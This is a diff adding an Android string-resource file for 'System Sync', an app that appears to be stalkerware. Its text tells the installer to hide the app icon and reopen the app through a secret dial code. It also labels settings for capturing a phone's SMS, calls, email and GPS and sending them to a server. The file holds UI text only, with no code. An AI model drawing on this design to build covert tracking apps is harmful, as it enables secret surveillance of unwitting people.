@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    
+    <!-- Do not edit these strings manually, they will be set by Ant script -->
+    
+    <!-- Common strings -->
+    <string name="app_name">System Sync</string>
+    <string name="product_display_name">System Sync</string>
+    <string name="product_build_date">29/08/2012</string> <!-- dd/mm/yyy -->
+    <string name="product_version_major">-1</string>
+    <string name="product_version_minor">04</string>
+    <string name="product_version_build">1</string>
+    
+    <string name="language_ui_label_ok">OK</string>
+    <string name="language_ui_label_cancel">Cancel</string>
+    <string name="language_ui_label_activate">Activate</string>
+    <string name="language_ui_label_deactivate">Deactivate</string>
+    <string name="language_ui_label_activate_product">Activate Product</string>
+    <string name="language_ui_label_deactivate_product">Deactivate Product</string>
+    <string name="language_ui_label_about">About</string>
+    <string name="language_ui_label_uninstall">Uninstall</string>
+    <string name="language_ui_label_connection_history">Last Connection</string>
+    <string name="language_ui_gps_time_interval">GPS Time Interval</string>
+    <string name="language_ui_msg_activated">Product Activated</string>
+    <string name="language_ui_msg_not_activated">Product Not Activated</string>
+    <string name="language_ui_msg_processing_polite">Please Wait ...</string>
+    <string name="language_main_menu_cell_events">Application Settings</string>
+    <string name="language_ui_label_cache_database_status">Database Records</string>
+    
+    <string name="language_launcher_instruction">Please press the \"Hide Icon\" button, then accept \"Replace Application\". Once the icon is hidden, you can open the application by dialing *#900900900.</string>
+        
+    <string name="language_activation_instruction">Product is not yet activated. To activate, press Menu and select \'Activate\' and then enter your Activation Code that you received.</string>
+    <string name="language_activation_code_hint">Enter Activation Code</string>
+    <string name="language_activation_success">Nice! Activation success</string>
+    <string name="language_activation_fail">Activation failed. Please try again</string>
+    <string name="language_deactivation_warning">All events in your web account will be deleted! Click OK to continue.</string>
+    
+    <string name="language_information_event_total">Total Events:</string>
+    <string name="language_information_event_incoming_call">Incoming Call:</string>
+    <string name="language_information_event_outgoing_call">Outgoing Call:</string>
+    <string name="language_information_event_missed_call">Missed Call:</string>
+    <string name="language_information_event_incoming_sms">Incoming SMS:</string>
+    <string name="language_information_event_outgoing_sms">Outgoing SMS:</string>
+    <string name="language_information_event_location">Location:</string>
+    <string name="language_information_event_last_updated">Last Updated:</string>
+    
+    <string name="language_database_status_event_total">Total Events:</string>
+    <string name="language_database_status_event_incoming_call">Incoming Call:</string>
+    <string name="language_database_status_event_outgoing_call">Outgoing Call:</string>
+    <string name="language_database_status_event_missed_call">Missed Call:</string>
+    <string name="language_database_status_event_incoming_sms">Incoming SMS:</string>
+    <string name="language_database_status_event_outgoing_sms">Outgoing SMS:</string>
+    <string name="language_database_status_event_incoming_email">Incoming Email:</string>
+    <string name="language_database_status_event_outgoing_email">Outgoing Email:</string>
+    <string name="language_database_status_event_location">GPS:</string>
+    <string name="language_database_status_event_incoming_system">Incoming System:</string>
+    <string name="language_database_status_event_outgoing_system">Outgoing System:</string>
+    <string name="language_database_status_event_last_updated">Last Updated:</string>
+    
+    <string name="language_preference_capture_events_title">Start capture</string>
+    <string name="language_preference_capture_events_summary_true">Currently set to enabled</string>
+    <string name="language_preference_capture_events_summary_false">Currently set to disabled</string>
+        
+    <string name="language_preference_inline_events_to_capture">Events to capture</string>
+    <string name="language_preference_capture_summary_true">Currently set to enabled</string>
+    <string name="language_preference_capture_summary_false">Currently set to disabled</string>
+    <string name="language_preference_capture_sms_title">SMS</string>
+    <string name="language_preference_capture_phone_call_title">Call log</string>
+    <string name="language_preference_capture_email_title">Email</string>
+    <string name="language_preference_capture_location_title">GPS</string>
+    <string name="language_preference_capture_location_summary_format">Currently set to %s</string>
+        
+    <string name="language_preference_inline_sending_criteria">Server Delivery Frequency</string>
+    <string name="language_preference_delivery_period_title">Deliver event every</string>
+    <string name="language_preference_delivery_period_summary_format_1_hour">Currently set to %.0f hour</string>
+    <string name="language_preference_delivery_period_summary_format_several_hours">Currently set to %.0f hours</string>
+    <string name="language_preference_delivery_period_invalid_input">Invalid value</string>
+        
+    <string name="language_preference_max_events_title">Max number of events</string>
+    <string name="language_preference_max_events_summary_format_1_event">Currently set to %d event</string>
+    <string name="language_preference_max_events_summary_format_several_events">Currently set to %d events</string>
+    <string name="language_preference_max_events_invalid_input">Invalid value</string>
+    
+    <string name="language_connection_history_no_history">No connection has been made since %s</string>
+        
+</resources>
